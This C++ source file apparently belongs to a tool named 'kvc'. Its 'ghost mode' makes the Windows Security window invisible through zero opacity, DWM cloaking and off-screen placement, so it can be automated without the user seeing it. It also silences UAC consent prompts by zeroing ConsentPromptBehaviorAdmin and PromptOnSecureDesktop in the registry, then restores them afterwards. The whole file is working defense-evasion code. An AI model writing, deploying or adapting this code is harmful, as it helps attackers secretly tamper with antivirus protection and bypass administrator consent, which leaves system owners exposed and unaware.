// DefenderStealth.cpp
// Ghost mode implementation: opacity manipulation, DWM cloaking, off-screen positioning, UAC bypass

#include "DefenderStealth.h"
#include <thread>
#include <chrono>
#include <iostream>

using namespace std::chrono_literals;

// Simple logging macros - cannot use common.h due to UIAutomation conflicts
#define INFO_LOG(msg) std::wcout << L"[*] " << msg << L"\n"
#define ERROR_LOG(msg) std::wcout << L"[-] " << msg << L"\n"
#define DEBUG_LOG(msg) // Disabled by default

struct FindWindowData {
    HWND hWndFound;
};

// EnumWindows callback: finds and cloaks the window immediately
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    FindWindowData* data = (FindWindowData*)lParam;
    wchar_t className[256] = { 0 };

    if (GetClassNameW(hwnd, className, 256)) {
        if (wcscmp(className, L"ApplicationFrameWindow") == 0) {
            if (IsWindowVisible(hwnd)) {

                // GHOST MODE: triple-layer invisibility
                
                // Layer 1: opacity hack - set alpha to 0
                LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
                if (!(exStyle & WS_EX_LAYERED)) {
                    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED);
                }
                SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);

                // Layer 2: DWM cloak - hides from window manager/taskbar
                int cloakValue = 1;
                DwmSetWindowAttribute(hwnd, DWMWA_CLOAK, &cloakValue, sizeof(cloakValue));

                // Layer 3: logical teleport - hijack restore position
                WINDOWPLACEMENT wp = { sizeof(WINDOWPLACEMENT) };
                if (GetWindowPlacement(hwnd, &wp)) {
                    wp.flags = WPF_ASYNCWINDOWPLACEMENT;
                    wp.showCmd = SW_SHOWNOACTIVATE;
                    wp.rcNormalPosition.left = -4000;
                    wp.rcNormalPosition.top = -4000;
                    wp.rcNormalPosition.right = -3200;
                    wp.rcNormalPosition.bottom = -3400;
                    SetWindowPlacement(hwnd, &wp);
                }

                // Layer 4: physical teleport - move off-screen immediately
                SetWindowPos(hwnd, NULL, -4000, -4000, 0, 0, 
                             SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE | SWP_NOREDRAW);

                // Keep window active for automation but completely hidden
                ShowWindow(hwnd, SW_SHOWNOACTIVATE);

                DEBUG_LOG(L"Window found and cloaked successfully");

                data->hWndFound = hwnd;
                return FALSE;
            }
        }
    }
    return TRUE;
}

// EnumWindows callback: find only (no cloaking) for pre-warm
BOOL CALLBACK EnumWindowsProcFindOnly(HWND hwnd, LPARAM lParam) {
    FindWindowData* data = (FindWindowData*)lParam;
    wchar_t className[256] = { 0 };

    if (GetClassNameW(hwnd, className, 256)) {
        if (wcscmp(className, L"ApplicationFrameWindow") == 0) {
            if (IsWindowVisible(hwnd)) {
                data->hWndFound = hwnd;
                return FALSE;
            }
        }
    }
    return TRUE;
}

// Registry helpers
bool DefenderStealth::ReadRegistryDword(const wchar_t* valueName, DWORD& outValue, bool& existed) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_READ, &hKey);
    
    if (result != ERROR_SUCCESS) {
        existed = false;
        return false;
    }

    DWORD type = REG_DWORD;
    DWORD size = sizeof(DWORD);
    result = RegQueryValueExW(hKey, valueName, nullptr, &type, (LPBYTE)&outValue, &size);
    RegCloseKey(hKey);
    
    existed = (result == ERROR_SUCCESS && type == REG_DWORD);
    return existed;
}

bool DefenderStealth::WriteRegistryDword(const wchar_t* valueName, DWORD value) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_WRITE, &hKey);
    
    if (result != ERROR_SUCCESS) return false;

    result = RegSetValueExW(hKey, valueName, 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

bool DefenderStealth::DeleteRegistryValue(const wchar_t* valueName) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, UAC_REGISTRY_PATH, 0, KEY_WRITE, &hKey);
    
    if (result != ERROR_SUCCESS) return false;

    result = RegDeleteValueW(hKey, valueName);
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// UAC encoding/decoding
DWORD DefenderStealth::EncodeUACStatus(DWORD cpba, bool cpbaExisted, DWORD posd, bool posdExisted) {
    DWORD encoded = 0;
    encoded |= (cpbaExisted ? (cpba & 0xFF) : KEY_NOT_EXISTED);
    encoded |= ((posdExisted ? (posd & 0xFF) : KEY_NOT_EXISTED) << 8);
    return encoded;
}

void DefenderStealth::DecodeUACStatus(DWORD encoded, DWORD& cpba, bool& cpbaExisted, DWORD& posd, bool& posdExisted) {
    BYTE cpbaByte = encoded & 0xFF;
    BYTE posdByte = (encoded >> 8) & 0xFF;
    
    cpbaExisted = (cpbaByte != KEY_NOT_EXISTED);
    cpba = cpbaExisted ? cpbaByte : 0;
    
    posdExisted = (posdByte != KEY_NOT_EXISTED);
    posd = posdExisted ? posdByte : 0;
}

bool DefenderStealth::BackupAndDisableUAC() {
    DEBUG_LOG(L"Backing up and disabling UAC prompts");
    
    DWORD cpba = 0, posd = 0;
    bool cpbaExisted = false, posdExisted = false;
    
    ReadRegistryDword(L"ConsentPromptBehaviorAdmin", cpba, cpbaExisted);
    ReadRegistryDword(L"PromptOnSecureDesktop", posd, posdExisted);
    
    DWORD encoded = EncodeUACStatus(cpba, cpbaExisted, posd, posdExisted);
    if (!WriteRegistryDword(UAC_BACKUP_KEY, encoded)) return false;
    
    bool success = true;
    success &= WriteRegistryDword(L"ConsentPromptBehaviorAdmin", 0);
    success &= WriteRegistryDword(L"PromptOnSecureDesktop", 0);
    
    return success;
}

bool DefenderStealth::RestoreUAC() {
    DEBUG_LOG(L"Restoring original UAC settings");
    
    DWORD encoded = 0;
    bool backupExisted = false;
    
    if (!ReadRegistryDword(UAC_BACKUP_KEY, encoded, backupExisted) || !backupExisted) return false;
    
    DWORD cpba = 0, posd = 0;
    bool cpbaExisted = false, posdExisted = false;
    DecodeUACStatus(encoded, cpba, cpbaExisted, posd, posdExisted);
    
    if (cpbaExisted) WriteRegistryDword(L"ConsentPromptBehaviorAdmin", cpba);
    else DeleteRegistryValue(L"ConsentPromptBehaviorAdmin");
    
    if (posdExisted) WriteRegistryDword(L"PromptOnSecureDesktop", posd);
    else DeleteRegistryValue(L"PromptOnSecureDesktop");
    
    DeleteRegistryValue(UAC_BACKUP_KEY);
    return true;
}

bool DefenderStealth::RecoverUACIfNeeded() {
    DWORD encoded = 0;
    bool backupExisted = false;
    if (ReadRegistryDword(UAC_BACKUP_KEY, encoded, backupExisted) && backupExisted) {
        INFO_LOG(L"Found incomplete UAC backup, restoring");
        return RestoreUAC();
    }
    return true;
}

// Window finder with ghost mode cloaking
HWND DefenderStealth::FindAndCloakSecurityWindow(int maxRetries) {
    FindWindowData data = { 0 };

    for (int i = 0; i < maxRetries; ++i) {
        EnumWindows(EnumWindowsProc, (LPARAM)&data);

        if (data.hWndFound) {
            HWND hwnd = data.hWndFound;

            // Double-tap insurance: re-apply opacity and position
            LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
            if (!(exStyle & WS_EX_LAYERED)) {
                SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED);
                SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
            }

            SetWindowPos(hwnd, NULL, -4000, -4000, 0, 0, 
                         SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE | SWP_SHOWWINDOW);
            
            return hwnd;
        }

        // Delay for slow hardware (battery saving mode/slow CPU)
        std::this_thread::sleep_for(100ms);
    }
    return NULL;
}

HWND DefenderStealth::FindSecurityWindowOnly(int maxRetries) {
    FindWindowData data = { 0 };

    for (int i = 0; i < maxRetries; ++i) {
        EnumWindows(EnumWindowsProcFindOnly, (LPARAM)&data);

        if (data.hWndFound) {
            return data.hWndFound;
        }

        std::this_thread::sleep_for(100ms);
    }
    return NULL;
}

// Volatile registry marker for session persistence
bool DefenderStealth::CheckVolatileWarmMarker() {
    HKEY hKey;
    // Open the specific subkey "WinDefCtl" which is created as volatile.
    // We cannot use the parent "Software\\kvc" directly as it might be persistent.
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\WinDefCtl", 0, KEY_READ, &hKey);
    
    if (result != ERROR_SUCCESS) {
        // Key does not exist, which means this is a cold boot (or first run after reboot)
        return false;
    }

    DWORD value;
    DWORD size = sizeof(DWORD);
    result = RegQueryValueExW(hKey, L"DefenderWarmed", nullptr, nullptr, (LPBYTE)&value, &size);
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS);
}

bool DefenderStealth::SetVolatileWarmMarker() {
    HKEY hKey;
    DWORD disposition;
    
    // Create volatile key (disappears on logout/reboot)
    // Targeting "Software\\kvc\\WinDefCtl" to ensure volatility works even if "kvc" exists permanently
    LONG result = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\kvc\\WinDefCtl", 
        0,
        NULL,
        REG_OPTION_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &disposition
    );
    
    if (result != ERROR_SUCCESS) {
        return false;
    }

    DWORD marker = 1;
    result = RegSetValueExW(hKey, L"DefenderWarmed", 0, REG_DWORD, (LPBYTE)&marker, sizeof(DWORD));
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS);
}
